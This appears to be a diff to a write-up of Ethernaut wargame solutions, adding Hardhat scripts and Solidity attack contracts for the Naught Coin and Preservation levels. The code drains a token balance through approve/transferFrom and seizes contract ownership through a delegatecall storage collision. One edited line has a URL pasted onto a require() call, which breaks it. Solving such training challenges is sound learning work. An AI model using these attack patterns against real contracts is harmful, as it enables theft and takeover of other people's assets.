@@ -488,7 +488,7 @@ contract GatekeeperTwoAttack {
 ```
 
 ```js
-const hre = require("hardhat");
+const hre = require("hardhat");https://solidity-by-example.org/hacks/delegatecall/
 
 async function main() {
   const target = (await hre.ethers.getContractFactory("GatekeeperTwo")).attach("<target contract address>");
@@ -499,6 +499,96 @@ async function main() {
   console.log(`Contract address: ${await contract.getAddress()}`);
 
   console.log(`Target entrant = ${await target.entrant()}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 15 Naught Coin
+
+Change the NaughtCoin.sol import to be `@openzeppelin/contracts/token/ERC20/ERC20.sol` and run `npm install @openzeppelin/contracts`
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = (await hre.ethers.getContractFactory("NaughtCoin")).attach("<target contract address>");
+
+  const [ signer ] = await hre.ethers.getSigners();
+  console.log(`Player address = ${signer.address}`);
+
+  const balance = await target.balanceOf(signer.address);
+  console.log(`Player balance = ${balance}`);
+
+  // Note that the spender (first argument) here is the owner
+  await target.approve(signer.address, balance);
+  await target.transferFrom(signer.address, await target.getAddress() /* Or any address */, balance);
+  console.log("Attack complete");
+
+  console.log(`Player balance = ${await target.balanceOf(signer.address)}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 16 Preservation
+
+```sol
+pragma solidity ^0.8.0;
+
+interface IPreservation {
+  function setFirstTime(uint _timeStamp) external;
+}
+
+contract PreservationAttack {
+  function attack(address target, address _library) external {
+    // When using delegatecall the library and calling contract are expected to have the same state variable layout.
+    // However LibraryContract's first state variable is storedTime and Preservation's is timeZone1Library,
+    // so Preservation.setFirstTime() causes Preservation's first state variable (timeZone1Library) to be overwritten.
+    // Ref: https://solidity-by-example.org/hacks/delegatecall/
+    IPreservation(target).setFirstTime(uint(uint160(_library)));
+
+    IPreservation(target).setFirstTime(0 /* Any value */);
+  }
+}
+
+contract PreservationAttackLibrary {
+  // Match the state variable layout of Preservation
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner;
+
+  function setTime(uint _time) public {
+    owner = tx.origin;
+  }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = (await hre.ethers.getContractFactory("Preservation")).attach("<target contract address>");
+  console.log(`Target owner = ${await target.owner()}`);
+
+  const library = await hre.ethers.deployContract("PreservationAttackLibrary");
+  await library.waitForDeployment();
+  console.log(`Library address: ${await library.getAddress()}`);
+
+  const contract = await hre.ethers.deployContract("PreservationAttack");
+  await contract.waitForDeployment();
+  console.log(`Contract address: ${await contract.getAddress()}`);
+
+  (await contract.attack(await target.getAddress(), await library.getAddress())).wait();
+  console.log("Attack complete");
+
+  console.log(`Target owner = ${await target.owner()}`);
 }
 
 main().catch((error) => {
